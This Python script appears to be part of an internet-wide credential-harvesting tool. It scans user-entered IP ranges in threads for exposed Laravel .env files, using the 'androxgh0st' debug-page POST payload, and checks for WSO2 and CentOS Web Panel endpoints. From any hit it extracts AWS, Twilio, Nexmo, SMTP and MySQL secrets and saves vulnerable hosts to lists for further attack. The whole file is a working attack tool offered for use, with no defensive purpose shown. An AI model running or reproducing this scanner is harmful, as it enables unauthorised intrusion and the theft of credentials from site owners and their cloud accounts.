import requests,random
from files.localuseragent import *
import time,ipaddress
import threading
from colorama import Fore
from multiprocessing import Lock
from iprange import dorkscan
from tool import get_smtp
import urllib3
from tool._print import print_centos, bad_site
from iprange import CVE_29464
from iprange import centos_panel
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
lock = threading.Lock()


def checkweb2(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    parameter = [':443/fileupload/toolsAny','/.env',':2031/login/index.php']
    for param in parameter:
        try:
            url_to_c = "http://"+url+param
            urls = requests.get(url_to_c, headers=headers, timeout=5, verify=False, allow_redirects=False)
            get_source = urls.text
            if "APP_KEY=" in get_source and "/.env" in url_to_c:
                # print(f"{Fore.BLUE}[laravel]: {Fore.CYAN}{url}")
                with open('result/laravel.txt','a') as wx:
                    wx.write(url + "/.env\n")
                get_smtp.get_aws(get_source)
                get_smtp.get_nexmo(get_source)
                get_smtp.get_twillio(get_source)
                get_smtp.get_smtp(url=url,text=get_source)
                get_smtp.get_mysql(url=url,text=get_source)
                return print_centos(cms="laravel", site=url)

            elif urls.status_code == 200 and ":443" in url_to_c:
                with open("list/cve.txt","a") as wx:
                    wx.write(f"https://{url}:443\n")
                return print_shell(cms=" WSO2  ", site=url)
            elif urls.status_code == 200 and ":2031/" in url_to_c:
                with open('list/centos.txt',"a") as xs:
                    xs.write(f"{url}:2031\n")
                    return print_shell(cms="centos ", site=url)
            else:
                urls = requests.post("http://"+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False)
                get_source = urls.text
                # print(get_source)
                if "<td>APP_KEY</td>" in get_source:
                    # print(f"{Fore.BLUE}[laravel]: {Fore.CYAN}{url}")
                    with open('result/laravel.txt','a') as wx:
                        wx.write(url + "/.env\n")
                    get_smtp.get_aws(get_source)
                    get_smtp.get_nexmo(get_source)
                    get_smtp.get_twillio(get_source)
                    get_smtp.get_smtp(url=url,text=get_source)
                    get_smtp.get_mysql(url=url,text=get_source)
                    return print_centos(cms="laravel", site=url)
        except Exception as e:
            return bad_site(site=url, cms="laravel")
            # print(e)
            # pass
    
def makethread18():
  try:
    global threads18
    threads18 = []
    jumlah = input("masukan jumlah thread: ")
    print("""input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253""")
    ipsmin = input("Start Ips : ")
    ipsmax = input("To Ips: ")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        ip = str(ipaddress.IPv4Address(ip_int))
        url = ip
        thread = threading.Thread(target=checkweb2 , args=(url,))
        threads18.append(thread)
        thread.start()
        if len(threads18) == th:
            for i in threads18:
                i.join()

  except Exception:
    pass